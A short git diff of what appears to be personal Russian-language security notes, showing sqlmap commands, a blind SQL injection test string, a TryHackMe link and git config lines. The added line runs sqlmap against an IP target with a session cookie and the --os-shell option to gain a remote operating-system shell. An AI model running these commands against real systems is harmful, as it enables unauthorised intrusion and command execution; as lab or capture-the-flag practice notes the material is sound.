@@ -13,6 +13,7 @@ sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --
 substring(database(),2,1)='B'
 https://tryhackme.com/room/sqlmap - пример использования с подгрузкой файла
 
+sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-agent --cookie='PHPSESSID=6et2iplhe59a7h6m2v55vjn49s' --os-shell
 
 #set git config values #Авторизация
 git config --global user.name "ваше имя"
